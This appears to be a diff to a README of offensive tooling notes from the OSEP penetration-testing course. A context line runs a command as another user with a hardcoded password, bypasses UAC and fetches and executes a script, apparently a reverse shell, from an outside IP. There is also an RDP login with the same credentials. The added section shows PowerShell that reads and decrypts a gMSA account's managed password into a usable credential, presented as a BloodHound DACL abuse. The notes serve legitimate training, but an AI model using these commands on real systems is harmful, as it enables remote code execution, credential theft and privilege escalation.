@@ -1,6 +1,6 @@
 Just a bunch of tools built/gathered along the OSEP course.
 
-# <ins>Useful Commands</ins>:
+# <ins>Useful Basic Commands</ins>:
 
 ### <ins>Run command as another user</ins>:
 - `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`
@@ -20,3 +20,19 @@ Using netexec:
 
 ### <ins>RDP to host using xfreerdp</ins>:
 - `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' +dynamic-resolution +clipboard`
+
+# BloodHound Dacls Abuse
+
+### GMSAPasswordReader
+
+Decrypt the gmsa password
+
+    $gmsa = Get-ADServiceAccount -Identity bir-adfs-gmsa -Properties msDS-ManagedPassword
+    $mp = $gmsa.'msDS-ManagedPassword'
+    $mp // Get the password in numbers
+    ConvertFrom-ADManagedPasswordBlob $mp
+
+If the clear-text password not appear, let's just use it.
+
+    $password = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
+    $cred = New-Object System.Management.Automation.PSCredential "GroupName" , $password
